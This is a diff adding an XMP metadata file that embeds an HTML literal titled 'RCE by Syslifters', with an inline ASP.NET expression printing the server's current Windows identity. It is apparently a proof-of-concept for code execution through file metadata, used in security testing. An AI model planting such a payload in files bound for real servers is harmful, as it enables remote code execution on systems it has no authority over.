@@ -1,0 +1,18 @@
+<x:xmpmeta xmlns:x="adobe:ns:meta/">
+  <rdf:RDF xmlns:rdf="http://www.w3.org/1999/02/22-rdf-syntax-ns#"
+           xmlns:dc="http://purl.org/dc/elements/1.1/"
+           xmlns:xh="http://example.com/ns/xh/1.0/">
+    <rdf:Description rdf:about="">
+      <dc:description>
+        <rdf:Alt>
+          <rdf:li xml:lang="x-default">XMP with HTML literal</rdf:li>
+        </rdf:Alt>
+      </dc:description>
+      <xh:snippet rdf:parseType="Literal">
+        <h1>RCE by Syslifters</h1>
+        <%@ Page Language="C#" %><%= System.Security.Principal.WindowsIdentity.GetCurrent().Name %>
+      </xh:snippet>
+    </rdf:Description>
+  </rdf:RDF>
+</x:xmpmeta>
+
